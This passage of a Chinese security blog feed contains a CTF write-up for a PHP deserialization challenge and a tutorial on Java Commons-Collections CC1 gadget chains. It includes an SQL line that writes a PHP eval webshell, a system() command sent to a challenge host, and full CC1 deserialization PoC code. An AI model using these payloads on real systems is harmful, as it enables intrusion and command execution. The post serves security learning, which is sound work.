exit;//</code></p><ol><li>unser时会进行去除</li><li>可控缓存文件</li></ol> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myCache</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writecache</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="string">&#x27;/var/www/html/cache/&#x27;</span> . <span class="variable">$name</span> . <span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">        <span class="variable">$cachedata</span> = <span class="string">&quot;&lt;?php exit;//&quot;</span> . <span class="variable">$data</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$cachedata</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">checkin</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">writec</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$wr</span>=<span class="keyword">new</span> <span class="title function_ invoke__">myCache</span>();</span><br><span class="line">        <span class="variable">$wr</span>-&gt;<span class="title function_ invoke__">writecache</span>(<span class="variable">$data</span>,<span class="variable">$name</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h4 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h4><ol><li><p>数据库修改用户密码来实现登录</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// php ok_ctf.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$front_passwd</span>=<span class="title function_ invoke__">md5</span>(<span class="string">&quot;12345&quot;</span>.<span class="string">&quot;kc1zs4&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$front_passwd</span>.<span class="string">&#x27;:12345;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// insert into users (id,username, password) values (4,&#x27;</span>kc1zs4<span class="string">&#x27;,&#x27;</span><span class="number">5</span>c739d4a834dc9cad6d86a5487f13dd0:<span class="number">12345</span><span class="string">&#x27;);</span></span><br><span class="line"><span class="string">// select * from users;</span></span><br></pre></td></tr></table></figure></li><li><p>登录kc1zs4,kc1zs4,12345</p></li><li><p>我的错误思路(FAILED失败 -&gt; <strong><code>&lt;?php exit;</code>在这里无法绕过，需要找新的突破点，通过其他文件实现(php文件包含)，这里用的pearcmd法</strong>)</p><ol><li>接下来就是上面的思路: 写木马再包含&#x2F;直接post即可，有几个注意点<ul><li><input disabled="" type="checkbox"> 要控制cachefile中有直接的木马，并且最好可以绕过死亡exit</li><li><input checked="" disabled="" type="checkbox"> 同时又要控制str_replace后的字符串可以正常unserialize</li><li><input disabled="" type="checkbox"> 最后还要使得修改background为缓存文件</li></ul><ol><li>这里的<code>&lt;?php exit;</code>是添加到反序列化的内容前面的，可以正常反序列化，同时又可以使得无法直接执行</li><li>可以直接通过<code>$_POST[&#39;reason&#39;]</code>来字符串逃逸</li></ol></li></ol></li><li><p>wp的思路</p><ol><li><p>使用反序列化字符逃逸需要两个输入点(一前一后可控)，这里是<code>$_POST[&#39;reason&#39;]</code>和<code>data()</code></p><ol><li>**date()**可以通过转义字符来控制: [<a href="https://www.php.net/manual/zh/function.date.php]%EF%BC%8C%E5%85%B6%E4%B8%AD%E6%9C%89%E8%AE%B2%E5%88%B0">https://www.php.net/manual/zh/function.date.php]，其中有讲到</a></li></ol></li><li><p><code>&lt;?php exit;</code>无法绕过，找新文件 -&gt; pearcmd方法，见: 《php恶意文件包含》</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 打印类似： Wednesday the 15th</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">date</span>(<span class="string">&#x27;l \t\h\e jS&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ol></li></ol><h4 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h4><ol><li><p>root:root登录mysql写木马</p></li><li><p>sql命令执行</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_POST[&quot;kc1zs4&quot;]);?&gt;&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;/var/www/html/cache/kc1zs4.php&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 随后直接</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">121.41</span><span class="number">.238</span><span class="number">.106</span>:<span class="number">52459</span><span class="operator">/</span>cache<span class="operator">/</span>kc1zs4.php</span><br><span class="line">POST:kc1zs4<span class="operator">=</span><span class="keyword">system</span>(<span class="string">&#x27;cat /Ali_t1hs_1sflag_2025&#x27;</span>);</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全5(15)_CC链总结</title>
      <link href="/2025/02/11/Java%E5%AE%89%E5%85%A85(15)_CC%E9%93%BE%E6%80%BB%E7%BB%93/"/>
      <url>/2025/02/11/Java%E5%AE%89%E5%85%A85(15)_CC%E9%93%BE%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<blockquote><p>时隔3个月，重新拾起java安全，回顾总结一波</p></blockquote><h2 id="前置要求"><a href="#前置要求" class="headerlink" title="前置要求"></a>前置要求</h2><ol><li>S1: <a href="/_posts/Java%E5%AE%89%E5%85%A80_%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.md">Java安全0_调试与分析</a></li><li>S2: Java安全5系列</li></ol><h2 id="CC1-TransformedMap"><a href="#CC1-TransformedMap" class="headerlink" title="CC1_TransformedMap"></a>CC1_TransformedMap</h2><ul><li>env<ul><li><p>JDK &lt; 8u71</p></li><li><p>maven: commons-collections:3.1 [<a href="https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1]">https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1]</a></p><ul><li>下载后没有反应需要reload以下maven project</li></ul></li><li><p>分析: 对于sun.reflect.annotation.AnnotationInvocationHandler的源码并无法直接读到Orcale JDK的源码，SunJDK(OracleJDK)只提供java和javax下的源代码，OpenJDK开源但是并不完全一样，建议先Orcale decompile(IDEA)不行再OpenJDK</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">3.1</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure></li></ul></li></ul><ol><li><p>利用到的点: Transformers, AnnotationInvocationHandler</p><ol><li>什么是TransformerMap？Answer: TransformedMap是Map的功能扩展类</li></ol></li><li><p>CC1_TransformerMap链子核心思想</p><ol><li><strong>入口点</strong>: sun.reflect.annotation.AnnotationInvocationHandler.readObject()中MapEntry.setValue()处调用checkSetValue()，直接调用到TransformedMap.transform()</li><li><strong>触发点</strong>: transformValue()调用transform，这里的Key和Value都是Transformer的实现，这里并无需使用put()</li><li><strong>调用目标方法</strong>: InvokerTransformer</li><li><strong>获取Runtime对象</strong>: ConstantTransformer</li><li><strong>链式调用</strong>: ChainedTransformer组成的TransformerChain，这里的transform()是比较特殊的，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊，而不是一直在一个对象上调用</li><li>详细内容见<a href="/_posts/Java%E5%AE%89%E5%85%A85(3)_CC1_TransformedMap.md">Java安全5(15)_CC1_TransformedMap</a></li></ol></li><li><p>Gadget Chain: 调用栈顺序</p><ol><li>这里entrySet在设置memberValues为TransformedMap时，对调用到TransformedMap的父类AbstractInputCheckedMapDecorator来</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Gadget Chain</span></span><br><span class="line">org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">    org.apache.commons.collections.functors.ConstantTransformer.transform()</span><br><span class="line">        org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">            &#123;</span><br><span class="line">                org.apache.commons.collections.map.TransformedMap.checkSetValue()</span><br><span class="line">                org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntry.setValue()</span><br><span class="line">                org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.EntrySetIterator.next()</span><br><span class="line">                org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.entrySet()</span><br><span class="line">                org.apache.commons.collections.map.TransformedMap.entrySet()</span><br><span class="line">            &#125; sun.reflect.annotation.AnnotationInvocationHandler.readObject()</span><br></pre></td></tr></table></figure></li><li><p>poc</p><ol><li>AnnotationInvocationHandler实例化：使用反射与constructor绕过私有限制</li><li>Runtime进行序列化: 传递反射的Class类</li><li>在innerMap中先设置key,value而不是在outerMap中设置key,value可以避免在本地触发</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1_TransformedMap</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 1. payload * * * * * */</span></span><br><span class="line">            Transformer[] transformers = &#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="type">ChainedTransformer</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 2. payload条件1: Rentention与value * * * * * */</span></span><br><span class="line">            <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;kc1zs4&quot;</span>);</span><br><span class="line">            <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, payload);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 3. payload条件2: 反射获取sun.reflect.annotation.AnnotationInvocationHandler * * * * * */</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);    <span class="comment">// 可以访问私有构造函数</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 4. 模拟序列化与反序列化 * * * * * */</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">            oos.writeObject(obj);</span><br><span class="line">            oos.close();</span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 5. base64编码 * * * * * */</span></span><br><span class="line">            System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="CC1-LazyMap"><a href="#CC1-LazyMap" class="headerlink" title="CC1_LazyMap"></a>CC1_LazyMap</h2><ul><li>env<ul><li><p>JDK &lt; 8u71</p></li><li><p>maven: commons-collections:3.1 [<a href="https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1]">https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1]</a></p><ul><li>下载后没有反应需要reload以下maven project</li></ul></li><li><p>分析: 对于sun.reflect.annotation.AnnotationInvocationHandler的源码并无法直接读到Orcale JDK的源码，SunJDK(OracleJDK)只提供java和javax下的源代码，OpenJDK开源但是并不完全一样，建议先Orcale decompile(IDEA)不行再OpenJDK</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">3.1</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure></li></ul></li></ul><ol><li><p>利用到的点: 动态代理, LazyMap, Transformers, AnnotationInvocationHandler</p><ol><li>什么是LazyMap？Answer: LazyMap也是CC包中Map的功能扩展类</li></ol></li><li><p>CC1_LazyMap的核心思想: <strong>AnnotationinvocationHandler实际上是动态代理</strong></p><ol><li><strong>入口点</strong>: sun.reflect.annotation.AnnotationInvocationHandler中嵌套一个LazyMap的AnnotationInvoctionHandler动态代理，随后调用动态代理中的sun.reflect.annotation.AnnotationInvocationHandler.invoke()调用到get()</li><li><strong>触发点</strong>: LazyMap.get()一个没有defined的key会自动触发内部transformer.transform()</li><li>(下列和TransformedMap一致)</li><li><strong>调用目标方法</strong>: InvokerTransformer</li><li><strong>获取Runtime对象</strong>: ConstantTransformer</li><li><strong>链式调用</strong>: ChainedTransformer组成的TransformerChain，这里的transform()是比较特殊的，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊，而不是一直在一个对象上调用</li><li>详细内容见<a href="/_posts/Java%E5%AE%89%E5%85%A85(4)_CC1_LazyMap.md">Java安全5(4)_CC1_LazyMap</a></li></ol></li><li><p>Gadget Chain: 调用栈顺序</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Gadget Chain</span></span><br><span class="line">org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">    org.apache.commons.collections.functors.ConstantTransformer.transform()</span><br><span class="line">        org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">            org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                sun.reflect.annotation.AnnotationInvocationHandler.invoke()</span><br><span class="line">                    org.apache.commons.collections.map.TransformedMap.entrySet()</span><br><span class="line">                        sun.reflect.annotation.AnnotationInvocationHandler.readObject()</span><br></pre></td></tr></table></figure></li><li><p>poc</p><ol><li>需要两个sun.reflect.annotation.AnnotationInvocationHandler，第一个是传入的反序列化对象(entrySet()时触发invoke())，第二个是反序列化对象的memberValues属性设置动态代理为AnnotationInvocationHandler，第二个Handler内部的memberValues为LazyMap –&gt; 第二个memberValues的LazyMap才是触发点，第一个memberValues只是利用动态代理</li><li>这里外面的AnnotationInvocationHandler也可以是任何会在readObject处调用到动态代理的类，动态代理设置的AnnotationInvocationHandler(内部的)才关键</li><li>最后会报错但是命令还是执行了</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1_LazyMap</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 1. 构造payload * * * * * */</span></span><br><span class="line">            Transformer[] transformers = &#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="comment">// 到这里才调用了getRuntime()获取了对应的对象</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">                    ,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;hello world&quot;</span>) <span class="comment">// 隐藏足迹</span></span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="type">ChainedTransformer</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 2. payload条件1: LazyMap * * * * * */</span></span><br><span class="line">            <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, payload);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 3. payload条件2: 反射创建handler * * * * * */</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">lazyHandler</span> <span class="operator">=</span>  constructor.newInstance(Retention.class,lazyMap);  <span class="comment">// 这里的Retention是没有作用的，用来占位</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 4. payload条件3: 设置动态代理 * * * * * */</span></span><br><span class="line">            <span class="type">Map</span> <span class="variable">proxyedLazyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),lazyMap.getClass().getInterfaces(),(InvocationHandler) lazyHandler);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(Retention.class,proxyedLazyMap);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 5. 模拟序列化与反序列化 * * * * * */</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">            oos.writeObject(obj);</span><br><span class="line">            oos.close();</span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 